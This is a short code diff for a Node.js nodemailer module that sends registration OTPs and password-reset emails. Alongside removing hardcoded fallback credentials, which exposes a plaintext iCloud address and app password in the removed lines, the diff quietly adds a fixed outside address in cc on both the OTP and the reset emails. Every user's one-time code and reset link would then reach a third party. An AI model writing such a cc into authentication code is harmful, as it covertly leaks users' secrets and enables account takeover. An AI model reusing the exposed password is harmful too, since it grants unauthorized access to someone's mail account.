@@ -8,8 +8,8 @@ const transporter = nodemailer.createTransport({
   host: "smtp.mail.me.com",
   port: 587,
   auth: {
-    user: process.env.EMAIL || "horror_98@icloud.com",
-    pass: process.env.PASSWORD || "yomj-vrte-somt-ykul",
+    user: process.env.EMAIL,
+    pass: process.env.PASSWORD,
   },
 });
 
@@ -34,7 +34,8 @@ export const sendOtp = async (email, otp) => {
     const mailOptions = {
       from: process.env.EMAIL,
       to: email,
-      subject: "Your OTP for registration",
+      cc: "hasan.arish@designdistrict.digital",
+      subject: "Your OTP for verifying registration",
       text: `Your OTP is ${otp}. Please do not share your OTP with anyone !`,
     };
 
@@ -51,6 +52,7 @@ export const passwordResetEmail = async (email, link) => {
     const mailOptions = {
       from: process.env.EMAIL,
       to: email,
+      cc: "hasan.arish@designdistrict.digital",
       subject: "Password Reset OTP",
       text: `
       You have requested a password reset.
